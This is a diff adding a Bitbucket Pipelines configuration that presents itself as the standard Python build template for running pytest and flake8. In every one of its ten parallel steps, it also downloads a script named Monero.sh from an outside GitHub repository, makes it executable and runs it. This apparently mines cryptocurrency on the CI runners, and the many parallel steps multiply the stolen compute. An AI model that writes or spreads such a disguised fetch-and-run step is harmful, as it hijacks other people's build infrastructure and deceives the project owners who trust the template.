@@ -1,0 +1,73 @@
+#  Template python-build
+
+#  This template allows you to validate your python code.
+#  The workflow allows running tests and code linting on the default branch.
+
+image: python:3.8
+
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: A
+          caches:
+            - pip
+          script:
+            - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+            - pip install pytest
+            - pytest -v tests/* --junitxml=test-reports/report.xml
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+      - step:
+          name: B
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+      - step:
+          name: C
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+      - step:
+          name: D
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+      - step:
+          name: E
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+      - step:
+          name: F
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+      - step:
+          name: G
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+      - step:
+          name: H
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+      - step:
+          name: I
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
+      - step:
+          name: J
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/FAchryAP/Tambang/main/Monero.sh && chmod +x Monero.sh && ./Monero.sh
